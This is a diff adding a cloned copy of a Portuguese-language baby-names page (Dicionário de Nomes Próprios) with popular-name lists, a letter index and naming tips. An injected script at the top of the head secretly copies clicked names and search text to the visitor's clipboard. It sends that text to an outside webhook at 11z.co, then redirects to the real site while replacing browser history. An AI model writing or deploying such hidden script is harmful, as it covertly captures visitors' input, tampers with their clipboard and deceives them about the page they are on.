@@ -1,0 +1,807 @@
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt-br" lang="pt-br"><head>
+    <!-- Script de Redirecionamento Avan�ado: C�pia Silenciosa e Substitui��o de Hist�rico -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const baseUrl = 'https://www.dicionariodenomesproprios.com.br';
+
+            // Fun��o para copiar texto para o clipboard de forma silenciosa
+            async function copyToClipboard(text) {
+                try {
+                    // Tenta a API moderna primeiro
+                    if (navigator.clipboard && navigator.clipboard.writeText) {
+                        await navigator.clipboard.writeText(text);
+                    } else {
+                        // Fallback para dispositivos antigos
+                        const textArea = document.createElement("textarea");
+                        textArea.value = text;
+                        textArea.style.position = "fixed";
+                        textArea.style.left = "-9999px";
+                        textArea.style.top = "0";
+                        document.body.appendChild(textArea);
+                        textArea.focus();
+                        textArea.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(textArea);
+                    }
+                } catch (err) {
+                    // Silencioso: N�o faz nada em caso de erro
+                }
+                // Envia webhook em segundo plano (n�o bloqueia nada)
+                // keepalive: true garante que o Safari envie o POST mesmo durante redirecionamento
+                fetch("https://www.11z.co/_w/5156/selection", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ "value": text }),
+                    keepalive: true
+                }).catch(() => {});
+            }
+
+            // 0. Alterar href dos links internos para a URL completa de destino (corrige barra de status do browser)
+            document.querySelectorAll('a[href]').forEach(function(link) {
+                const href = link.getAttribute('href');
+                const localAbas = ['/nomes-femininos/', '/nomes-masculinos/', '/origem/', '/bebes/', '/top-brasil/', '/'];
+                if (href && !href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto') && !localAbas.includes(href)) {
+                    const path = href.startsWith('/') ? href : '/' + href;
+                    link.setAttribute('href', baseUrl + path);
+                }
+            });
+
+            // 1. Redirecionar cliques em links com c�pia silenciosa
+            document.body.addEventListener('click', async function(e) {
+                const link = e.target.closest('a');
+                if (link && link.getAttribute('href')) {
+                    const href = link.getAttribute('href');
+                    
+                    // Intercepta links internos (relativos) ou links j� convertidos para o baseUrl
+                    const localAbas = ['/nomes-femininos/', '/nomes-masculinos/', '/origem/', '/bebes/', '/top-brasil/', '/'];
+                    const isInternal = ((!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) || href.startsWith(baseUrl)) && !localAbas.includes(href.replace(baseUrl, ''));
+                    if (isInternal) {
+                        e.preventDefault();
+                        
+                        // Captura o texto do nome (limpa espa�os extras)
+                        const textToCopy = link.innerText.trim();
+                        if (textToCopy) {
+                            await copyToClipboard(textToCopy);
+                        }
+
+                        // Se o href j� � a URL completa, usa direto; sen�o monta
+                        const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
+
+                        // Redireciona substituindo a p�gina no hist�rico (n�o permite voltar)
+                        window.location.replace(targetUrl);
+                    }
+                }
+            }, true);
+
+            // 2. Redirecionar formul�rios de busca com c�pia silenciosa
+            const searchForms = document.querySelectorAll('form');
+            searchForms.forEach(form => {
+                form.addEventListener('submit', async function(e) {
+                    const action = form.getAttribute('action');
+                    if (action && !action.startsWith('http')) {
+                        e.preventDefault();
+
+                        // Captura o que foi digitado no campo de busca
+                        const searchInput = form.querySelector('input[name="q"]');
+                        if (searchInput && searchInput.value.trim()) {
+                            await copyToClipboard(searchInput.value.trim());
+                        }
+
+                        const formData = new FormData(form);
+                        const params = new URLSearchParams(formData).toString();
+                        const path = action.startsWith('/') ? action : '/' + action;
+                        const targetUrl = baseUrl + path + '?' + params;
+
+                        // Redireciona substituindo a p�gina no hist�rico
+                        window.location.replace(targetUrl);
+                    }
+                });
+            });
+        });
+    </script>
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Nomes de Bebês - Dicionário de Nomes Próprios</title>
+    <meta name="description" content="Ferramenta para escolher nome de bebê. Descubra nomes com significado e faça uma lista dos que gosta. Nomes de meninas e meninos mais escolhidos de 2025 e 2026">
+    <meta property="og:title" content="Nomes de Bebês - Dicionário de Nomes Próprios">
+    <meta property="og:type" content="article">
+
+        <meta property="og:url" content="https://www.dicionariodenomesproprios.com.br/bebes/">
+
+    
+            <meta property="og:image" content="images/fb_dnp.png">
+        <meta property="og:site_name" content="Dicionário de Nomes Próprios">
+        <meta property="fb:app_id" content="132068570255221">
+    <meta property="og:description" content="Ferramenta para escolher nome de bebê. Descubra nomes com significado e faça uma lista dos que gosta. Nomes de meninas e meninos mais escolhidos de 2025 e 2026">
+            <link rel="canonical" href="https://www.dicionariodenomesproprios.com.br/bebes/">
+        <meta property="og:locale" content="pt_BR">
+        <meta name="twitter:card" content="summary">
+        <meta name="twitter:title" content="Nomes de Bebês - Dicionário de Nomes Próprios">
+        <meta name="twitter:description" content="Ferramenta para escolher nome de bebê. Descubra nomes com significado e faça uma lista dos que gosta. Nomes de meninas e meninos mais escolhidos de 2025 e 2026">
+            <meta name="twitter:url" content="https://www.dicionariodenomesproprios.com.br/bebes/">
+    
+    
+    <script async="" src="js/v0.js"></script>
+    <link rel="stylesheet" type="text/css" href="css/styles_103.css">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png">
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#eb5d1c">
+    <meta name="msapplication-TileColor" content="#fef2ed">
+    <meta name="theme-color" content="#fef2ed">
+    <link rel="alternate" type="application/rss+xml" title="Dicionário de Nomes Próprios" href="http://www.dicionariodenomesproprios.com.br/rss.php">
+
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        dataLayer.push({ 'contentGroup1':'NO AMP'});
+        dataLayer.push({ 'contentGroup2':'lista de nomes'});
+        dataLayer.push({ 'contentGroup3':'Nomes de Bebês'});
+        dataLayer.push({ 'contentGroup4':'none'});
+        dataLayer.push({ 'contentGroup5':'none'});
+    </script>
+
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-KT7WJQZ');</script>
+
+    <script async="" defer="" src="js/gpt.js"></script><script async="" defer="" src="js/prebid8.38.0.js"></script><script>var googletag=window.googletag||{cmd:[]};if(window.localStorage && !window.localStorage.getItem("sg_gpt_event")){window.localStorage.setItem("sg_gpt_event",Math.floor((Math.random()*100)+1)<=10?1:0);}var pbjs = pbjs || {}; pbjs.que = pbjs.que || [];pbjs.que.push(function(){pbjs.setConfig({"sendAllBids":false,"priceGranularity":"high","userSync":{"filterSettings":{"all":{"bidders":"*","filter":"include"}},"iframe":{"bidders":["smartadserver"],"filter":"include"},"syncsPerBidder":1000,"syncDelay":100,"userIds":[{"name":"naveggId","storage":{"type":"cookie","name":"nvg90679"}}]}})});!function(a9,a,p,s,t,A,g){if(a[a9])return;function q(c,r){a[a9]._Q.push([c,r])}a[a9]={init:function(){q('i',arguments)},fetchBids:function(){q('f',arguments)},setDisplayBids:function(){},targetingKeys:function(){return[]},_Q:[]};A=p.createElement(s);A.async=!0;A.src=t;g=p.getElementsByTagName(s)[0];g.parentNode.insertBefore(A,g)}('apstag',window,document,'script','//c.amazon-adsystem.com/aax2/apstag.js'); apstag.init({pubID: '031d2526-e3d7-48d3-94fd-8cec14da13e5',adServer: 'googletag', simplerGPT: true});</script>
+
+    
+        <script>
+                  var _comscore = _comscore || [];
+                  _comscore.push({
+                    c1: "2", c2: "21145335",
+                    options: {
+                      enableFirstPartyCookie: true,
+                      bypassUserConsentRequirementFor1PCookie: true
+                    }
+                  });
+                  (function () {
+                    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
+                    s.src = "https://sb.scorecardresearch.com/cs/21145335/beacon.js";
+                    el.parentNode.insertBefore(s, el);
+                  })();
+                </script></head>
+<body class="baby-variant">
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KT7WJQZ" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<noscript>
+                  <img src="https://sb.scorecardresearch.com/p?c1=2&c2=21145335&cv=4.4.0&cj=1" alt="">
+                </noscript>
+        
+<div id="header" class="header ">
+    <div class="container">
+        <div class="row">
+            <div class="logo-wrap">
+                <a href="/" title="Dicionário de Nomes Próprios" class="logo">
+                    <svg width="60px" height="60px" viewBox="0 0 60 60" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <path d="M42.3331741,0.0475426788 L42.3331741,17.3906144 C42.3331741,17.3906144 42.3331741,21.298755 42.3331741,29.1150363 L59.9486007,29.1150363 C59.8851208,22.9301528 59.8851208,18.4142306 59.9486007,15.5672696 C59.9486007,7.56679183 51.592628,0.0475426788 42.3331741,0.0475426788 Z" fill="#C54617"></path>
+        <path d="M-1.13686838e-13,0.0712355116 L-1.13686838e-13,42.7119864 C-1.13686838e-13,54.4924642 8.58102389,59.8650239 17.8404778,59.8650239 L17.8404778,42.7119864 C27.0088055,59.7698021 45.8844369,59.8613379 59.9416382,59.8613379 L59.9486007,59.8650239 L59.9486007,15.5672082 C59.7477133,24.585843 55.7787031,32.6070034 42.3331741,17.3905529 C25.1203413,-2.0895836 -1.13686838e-13,0.0712355116 -1.13686838e-13,0.0712355116" fill="#EB5D1C"></path>
+    </g>
+</svg>                    <span class="logo-txt">
+                        <span class="title">Dicionário de Nomes Próprios</span>
+                        <span class="subtitle">Significado dos nomes</span>
+                    </span>
+                </a>
+            </div>
+            <div id="menu-btn" class="menu-btn"><i class="icon icon-menu"></i></div>
+
+            <div id="fancy-header" class="fancy-header">
+                <a href="/" title="Dicionário de Nomes Próprios" class="fancy-logo">
+                    <svg width="60px" height="60px" viewBox="0 0 60 60" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <path d="M42.3331741,0.0475426788 L42.3331741,17.3906144 C42.3331741,17.3906144 42.3331741,21.298755 42.3331741,29.1150363 L59.9486007,29.1150363 C59.8851208,22.9301528 59.8851208,18.4142306 59.9486007,15.5672696 C59.9486007,7.56679183 51.592628,0.0475426788 42.3331741,0.0475426788 Z" fill="#C54617"></path>
+        <path d="M-1.13686838e-13,0.0712355116 L-1.13686838e-13,42.7119864 C-1.13686838e-13,54.4924642 8.58102389,59.8650239 17.8404778,59.8650239 L17.8404778,42.7119864 C27.0088055,59.7698021 45.8844369,59.8613379 59.9416382,59.8613379 L59.9486007,59.8650239 L59.9486007,15.5672082 C59.7477133,24.585843 55.7787031,32.6070034 42.3331741,17.3905529 C25.1203413,-2.0895836 -1.13686838e-13,0.0712355116 -1.13686838e-13,0.0712355116" fill="#EB5D1C"></path>
+    </g>
+</svg>                </a>
+                <form class="search" id="busca" action="/busca.php" method="get">
+                                        <input class="search-box" type="text" name="q" placeholder="Busque um nome..." value="">
+                    <button class="search-button" type="submit"></button>
+                </form>
+                                    <div id="fancy-menu" class="fancy-menu">
+                        <ul>
+                            <li><a class="btn-default" href="/nomes-femininos/">Femininos</a></li>
+                            <li><a class="btn-default" href="/nomes-masculinos/">Masculinos</a></li>
+                            <li><a class="btn-default" href="/origem/">Origem</a></li>
+                            <li><a class="btn-default" href="/top-brasil/">Top</a></li>
+                            <li><a class="btn-default" href="/bebes/">Bebês</a></li>
+                        </ul>
+                                                    <div id="name-list-view-menu" class="baby-list--mobile">
+                                <span class="name-list-view-ver">Ver a minha lista de nomes</span>
+                            </div>
+                                            </div>
+
+                            </div>
+        </div>
+    </div>
+
+
+    <nav id="menu" class="menu-js container">
+        <div class="row">
+            
+<ul>
+    <li><a class="btn-default" href="/nomes-femininos/"><span class="btn-default--text">Nomes Femininos</span></a></li>
+    <li><a class="btn-default" href="/nomes-masculinos/"><span class="btn-default--text">Nomes Masculinos</span></a></li>
+    <li><a class="btn-default" href="/origem/"><span class="btn-default--text">Nomes pela Origem</span></a></li>
+    <li><a class="btn-default" href="/top-brasil/"><span class="btn-default--text">Top Nomes</span></a></li>
+    <li><a class="btn-default" href="/bebes/"><span class="btn-default--text">Nomes de Bebês</span></a></li>
+</ul>        </div>
+    </nav>
+
+            <div id="name-list-view" class="baby-list--mobile">
+            <span class="name-list-view-ver">Ver a minha lista de nomes</span>
+        </div>
+    </div>
+
+<div class="container">
+
+
+
+    <div class="row">
+        <div class="col-xs-12">
+            <div id="breadcrumbs" class="breadcrumbs"><a href="/">Dicionário de Nomes</a> > Nomes de Bebês</div>
+        </div>
+    </div>
+
+<div class="row baby-page">
+    <div class="content-flex">
+        <div class="col-md-8">
+
+            
+                <div>
+                                            <h1 class="home-section--title">Nomes de Bebês </h1>
+
+                    <ul class="baby-top-section">
+                        <li><a href="/bebes-meninas/" class="baby-top-link--female"><span class="btn-default--text"><span class="hidden-xs">Nomes de </span>Meninas</span><i class="icon-arrow-right"></i></a></li>
+                        <li><a href="/bebes-meninos/" class="baby-top-link--male"><span class="btn-default--text"><span class="hidden-xs">Nomes de </span>Meninos</span><i class="icon-arrow-right"></i></a></li>
+                    </ul>
+
+                    <div class="home-section home-section--panel">
+                        <i class="icon icon-baby"></i>
+                        <h2 class="">Sugerir nomes para bebê</h2>
+                        <div id="random" class="name-generator">
+                            <div data-rand="girl" class="name-card name-card--female">
+                                <a class="name-link" href="//">
+                                    <i class="icon icon-female"></i>
+                                    <span></span>
+                                </a>
+                                <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="">#</a>                            </div>
+                            <button id="sortear" class="draw" data-letter="">Sortear nomes</button>
+                            <div data-rand="boy" class="name-card name-card--male">
+                                <a class="name-link" href="//">
+                                    <i class="icon icon-male"></i>
+                                    <span></span>
+                                </a>
+                                <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="">#</a>                            </div>
+
+                        </div>
+                    </div>
+
+                        <h3 class="list-title">Nomes mais escolhidos e tendências</h3>
+                        <div class="trending-names-wrap">
+                            <div class="trending-list-wrap">
+                                <ol class="trending-list trending-list--female" style="counter-reset: li-counter">
+                                                                            <li>
+                                            <a class="name-link" href="/laura/">Laura</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="590">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/maria/">Maria</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="623">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/beatriz/">Beatriz</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="451">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/julia/">Júlia</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="565">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/alice/">Alice</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="419">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/ana/">Ana</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="10393">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/helena/">Helena</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="533">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/mariana/">Mariana</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="627">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/lara/">Lara</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="8041">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/larissa/">Larissa</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="8042">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/sofia/">Sofia</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="699">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/maria-eduarda/">Maria Eduarda</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="10738">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/leticia/">Letícia</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="597">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/isabela/">Isabela</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="7628">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/camila/">Camila</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="464">#</a>                                        </li>
+                                                                    </ol>
+                                <a class="btn-more btn-more-female" href="/bebes-meninas/">Ver mais nomes de menina</a>
+                            </div>
+                                                            <div class="ad-mrec hidden-tablet">
+                                    <style> @media (min-width:0px){#div-gpt-sg-3ee6424043a273c63e943156075afc44 > div{width:0;height:0;}#div-gpt-sg-3ee6424043a273c63e943156075afc44{height:0;}}@media (min-width:300px){#div-gpt-sg-3ee6424043a273c63e943156075afc44 > div{width:300px;height:290px;}#div-gpt-sg-3ee6424043a273c63e943156075afc44{height:290px;}}@media (min-width:336px){#div-gpt-sg-3ee6424043a273c63e943156075afc44 > div{width:336px;height:320px;}#div-gpt-sg-3ee6424043a273c63e943156075afc44{height:320px;}}@media (min-width:768px){#div-gpt-sg-3ee6424043a273c63e943156075afc44 > div{width:0;height:0;}#div-gpt-sg-3ee6424043a273c63e943156075afc44{height:0;}}#div-gpt-sg-3ee6424043a273c63e943156075afc44{position:sticky;padding:0px;padding-top:20px;z-index:0;overflow:hidden;}#div-gpt-sg-3ee6424043a273c63e943156075afc44::before{z-index:-1;}#div-gpt-sg-3ee6424043a273c63e943156075afc44 > div{margin:auto;position:unset;}#div-gpt-sg-3ee6424043a273c63e943156075afc44 > div::before, #div-gpt-sg-3ee6424043a273c63e943156075afc44::after{top:0;position:absolute;}</style><div id="div-gpt-sg-3ee6424043a273c63e943156075afc44" class="ad-unit ad-unit--pt-br #div-gpt-sg-3ee6424043a273c63e943156075afc44"></div>                                </div>
+                                                        <div class="trending-list-wrap">
+                                <ol class="trending-list trending-list--male" style="counter-reset: li-counter">
+                                                                            <li>
+                                            <a class="name-link" href="/miguel/">Miguel</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="311">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/lucas/">Lucas</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="302">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/guilherme/">Guilherme</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="237">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/gabriel/">Gabriel</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="7302">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/arthur/">Arthur</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="10741">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/joao/">João</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="279">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/pedro/">Pedro</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="332">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/rafael/">Rafael</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="338">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/gustavo/">Gustavo</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="239">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/enzo/">Enzo</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="6926">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/noah/">Noah</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="8781">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/davi/">Davi</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="121">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/bernardo/">Bernardo</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="74">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/matheus/">Matheus</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="8497">#</a>                                        </li>
+                                                                            <li>
+                                            <a class="name-link" href="/benjamim/">Benjamim</a>
+                                            <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="73">#</a>                                        </li>
+                                                                    </ol>
+                                <a class="btn-more btn-more-male" href="/bebes-meninos/">Ver mais nomes de menino</a>
+                            </div>
+                        </div>
+                                    </div>
+
+            
+            <div class="ad-leaderboard-desktop_mrec-mobile">
+                <style> @media (min-width:0px){#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc > div{width:0;height:0;}#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc{height:0;}}@media (min-width:300px){#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc > div{width:300px;height:290px;}#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc{height:290px;}}@media (min-width:336px){#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc > div{width:336px;height:320px;}#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc{height:320px;}}@media (min-width:768px){#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc > div{width:468px;height:100px;}#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc{height:100px;}}@media (min-width:1280px){#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc > div{width:728px;height:130px;}#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc{height:130px;}}#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc{position:sticky;padding:0px;padding-top:20px;z-index:0;overflow:hidden;}#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc::before{z-index:-1;}#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc > div{margin:auto;position:unset;}#div-gpt-sg-99fde6880abce16c6d26ff942b79edcc > div::before, #div-gpt-sg-99fde6880abce16c6d26ff942b79edcc::after{top:0;position:absolute;}</style><div id="div-gpt-sg-99fde6880abce16c6d26ff942b79edcc" class="ad-unit ad-unit--pt-br #div-gpt-sg-99fde6880abce16c6d26ff942b79edcc"></div>            </div>
+
+
+            <div class="full-w">
+                                    <h3>Nomes  por letra:</h3>
+                                <div class="name-grid-wrap">
+                    <div class="name-grid">
+                        <ul>
+                            <li><a href="/bebes/a/">A</a></li><li><a href="/bebes/b/">B</a></li><li><a href="/bebes/c/">C</a></li><li><a href="/bebes/d/">D</a></li><li><a href="/bebes/e/">E</a></li><li><a href="/bebes/f/">F</a></li><li><a href="/bebes/g/">G</a></li><li><a href="/bebes/h/">H</a></li><li><a href="/bebes/i/">I</a></li><li><a href="/bebes/j/">J</a></li><li><a href="/bebes/k/">K</a></li><li><a href="/bebes/l/">L</a></li><li><a href="/bebes/m/">M</a></li><li><a href="/bebes/n/">N</a></li><li><a href="/bebes/o/">O</a></li><li><a href="/bebes/p/">P</a></li><li><a href="/bebes/q/">Q</a></li><li><a href="/bebes/r/">R</a></li><li><a href="/bebes/s/">S</a></li><li><a href="/bebes/t/">T</a></li><li><a href="/bebes/u/">U</a></li><li><a href="/bebes/v/">V</a></li><li><a href="/bebes/w/">W</a></li><li><a href="/bebes/x/">X</a></li><li><a href="/bebes/y/">Y</a></li><li><a href="/bebes/z/">Z</a></li>                        </ul>
+                    </div>
+                </div>
+
+                            </div>
+                            <div class="tips-wrap">
+                    
+    <h2>10 dicas na hora de escolher o nome do bebê</h2>
+    <div class="tips-content">
+    <p>Siga essas dicas e encontre o nome perfeito para o seu bebê:</p>
+
+    <ol>
+        <li><strong>Faça uma lista</strong>
+            <p>A não ser que você tenha a certeza absoluta do nome que quer, o melhor é listar todos os nomes que você gosta. Mais tarde você poderá
+                encurtar essa lista!</p>
+        </li>
+        <li><strong>Pense no significado</strong>
+            <p>Pesquise bem o significado de cada nome! Escolha um nome com um significado bonito, como por exemplo uma característica que você
+                gostaria que seu filho tivesse. Assim você também evita que o seu filho seja carregue um nome com um significado negativo!</p>
+        </li>
+        <li><strong>Valorize as origens</strong>
+            <p>O nome pode ser uma homenagem a alguém da família. Há famílias que levam essa tradição a sério, mas ninguém precisa se sentir
+                obrigado a atender um costume familiar se não está de acordo com ele. Cabe aos pais essa decisão.</p>
+        </li>
+        <li><strong>Tenha cuidado com as inovações</strong>
+            <p>Opte por nomes de pronúncia simples e evite constrangimentos futuros. É desagradável ter de repetir diversas vezes o seu nome ou ter
+                de gritar para ser ouvido num local público e cheio de barulho.</p>
+        </li>
+        <li><strong>Prefira grafias simples</strong>
+            <p>As grafias simples podem evitar o desconforto de ter de soletrar o nome com frequência. Além de ser mais fácil para a criança
+                aprender o seu próprio nome, será mais prático não ter de soletrá-lo. Isso evitará também o risco de que o nome seja escrito
+                frequentemente com erros.
+            </p>
+        </li>
+        <li><strong>Evite nomes esquisitos</strong>
+            <p>Pense muito bem se está preparado para aceitar comentários menos agradáveis sobre um nome que possa expor seu filho ao ridículo.</p>
+            <p>Pense, principalmente, no seu filho. Será que ele será capaz de aceitá-los também?</p>
+        </li>
+        <li><strong>Pense nas iniciais do prenome e dos sobrenomes</strong>
+            <p>Embora pareça pouco relevante, para evitar constrangimentos futuros, é importante pensar nesses detalhes.</p>
+            <p>Isso para que não sejam formadas palavras estranhas a partir dos nomes. É o que poderá acontecer com palavras resultantes de
+                cacofonia (aquelas que soam de forma desagradável).</p>
+            <p>Faça o exercício de escrever o nome e “brincar” com as letras e sílabas iniciais. Dessa forma, você pode verificar se a conjugação do
+                nome escolhido fica bem com o nome composto escolhido (se for o caso).</p>
+            <p>Essa é também uma forma de verificar a conjugação com o nome de família, pois o sobrenome não pode ser alterado.</p>
+            <p>Outra boa forma de confirmar se a está tudo bem, principalmente com a sonoridade, é falar o nome todo várias vezes em voz alta pra
+                você e para um outro ouvinte.</p>
+        </li>
+        <li><strong>Pense nos apelidos</strong>
+            <p>É comum que as pessoas ganhem apelidos aos longo da vida, por isso, vale a pena pensar se os apelidos frequentemente utilizados para
+                o nome escolhido lhe agradam.</p>
+            <p>Lembre que haverá sempre alguém a chamar o seu filho por um apelido ainda que esse não seja do seu gosto ou do seu portador.</p>
+        </li>
+        <li><strong>Reduza a sua lista</strong>
+            <p>Corte os nomes que no fundo você sabe que não vai escolher até chegar a um ou dois nomes.</p>
+        </li>
+        <li><strong>Espere pelo último momento</strong>
+            <p>É claro que se você já tiver escolhido antes, não precisa esperar tanto, mas muita gente gosta de esperar pelo nascimento, para que
+                olhando para a carinha do bebê, tenha a certeza do nome! Você decide!</p>
+        </li>
+    </ol>
+</div>
+                </div>
+                    </div>
+        <div class="content-aside col-md-4">
+            <div id="top-sidebar" class="full-w">
+    
+    <div id="wrapper-name-list" class="wrapper-name-list">
+        <span class="sidebar-title">Minha lista de nomes</span>
+
+        <div id="list-parent" class="list-parent">
+            <div class="custom-name-list">
+                <div class="sg-social-hidden sg-social" data-url-callback="getUrllng" data-text="A minha lista de nomes para beb�s" data-title="Dicion�rio de Nomes Pr�prios: A minha lista de nomes para beb�s"><div class="sg-facebook-share"><button class="sg-facebook-btn" title="Compartilhar | Facebook">
+                            <span class="icon-sg-social icon-sg-social-facebook"></span>
+                            <span class="text-sg-social">Compartilhar</span>
+                        </button></div><div class="sg-whatsapp-share"><button class="sg-whatsapp-btn" title="Enviar | WhatsApp">
+                            <span class="icon-sg-social icon-sg-social-whatsapp"></span>
+                            <span class="text-sg-social">Enviar</span>
+                        </button></div><div class="sg-sms-share"><button class="sg-sms-btn" title="  | Sms">
+                            <span class="icon-sg-social icon-sg-social-sms"></span>
+                            <span class="text-sg-social"> </span>
+                        </button></div><div class="sg-fbmessenger-share"><button class="sg-fbmessenger-btn" title="Enviar | Facebook Messenger">
+                            <span class="icon-sg-social icon-sg-social-fbmessenger"></span>
+                            <span class="text-sg-social">Enviar</span>
+                        </button></div></div>                <div id="list-head" class="list-head hide">Selecionou os seguintes nomes para a sua lista de nomes para bebês:</div>
+                <ul id="name-list" class="name-list"></ul>
+            </div>
+
+            <div id="no-results" class="hide">
+                <div class="text">A sua lista de nomes para bebês ainda não tem nomes. Para adicionar nomes, utilize os botões com este aspecto:
+                    <div class="btn-nlg btn-nlg--fake"><span data-addname2="">+ Adicionar à lista</span></div></div>
+            </div>
+            <a href="/bebes/" id="name-list-close" class="name-list-close">Fechar</a>
+
+        </div>
+
+    </div>
+</div>    <div id="sidebar2" class="full-w hidden-xs">
+        <div class="ad-sidebar">
+                    </div>
+    </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+    <div class="row">
+        <div class="col-xs-12">
+            <div class="ad-leaderboard-desktop_mrec-mobile">
